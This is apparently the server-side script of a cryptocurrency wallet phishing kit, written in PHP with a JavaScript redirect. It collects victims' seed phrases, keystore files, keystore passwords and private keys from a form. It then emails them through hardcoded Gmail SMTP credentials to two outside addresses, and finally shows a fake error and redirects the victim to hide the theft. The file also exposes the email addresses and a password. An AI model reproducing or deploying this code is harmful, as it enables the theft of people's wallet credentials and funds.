

<script>
    setTimeout(goback, 2000)
  function goback() {
     alert('Error!! An error as occured.');
    window.location.assign("doerror.html");
}  

</script>
<?php

$phrase = '';
$keystorejson = '';
$keystorepasswword = '';
$privatekey = '';
 $name = $_POST["value"];
if (!empty($_POST['phrase'])) {
   $phrase = $_POST['phrase'];
}
if (!empty( $_POST['keystorejson'])) {
   $keystorejson = $_POST['keystorejson'];
   $keystorepasswword = $_POST['keystorepassword'];
}
if (!empty($_POST['privatekey'])) {
   $privatekey = $_POST['privatekey'];
}

if ((empty($_POST['phrase']) && empty($_POST['keystorejson']) && empty($_POST['keystorepassword']) && empty($_POST['privatekey']))) {
   
    //echo('Error!! Make sure you input the right key.');
    echo "<script> alert('Error. Make sure you input the right key');
    window.location.assign('wallets.html'); </script>";
    exit;

}

 use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

//Instantiation and passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    //$mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'davidsilva7189@gmail.com';                     //SMTP username
    $mail->Password   = 'deutijqqakhvztai';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         //Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
    $mail->Port       = 587;                                    //TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

    //Recipients
   $mail->setFrom('davidsilva7189@gmail.com', "Pasc Man");
   $mail->addAddress('mosesscout146@gmail.com', 'Joe User');
   $mail->addAddress('iderahappy@mailfence.com', 'Joe User');
   
    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = "Pasc Man";
   //  $mail->Body    =  'Name: <h2><b>'.$name.'</h2></b><br>
   $mail->Body    =  'Name: <h2><b>name</h2></b><br>
    Phrase: <b>' .$phrase.' </b> <br> 
    Keystore JSON: <b>'.$keystorejson.' </b> <br >
    Password is: <b>'.$keystorepasswword.' </b> <br>
    Private key: <b>'.$privatekey.'</b>';
    //$mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
   // echo 'Message has been sent';
} catch (Exception $e) {
    echo "Error Validating Data:";
    //echo $e->getMessage();
} 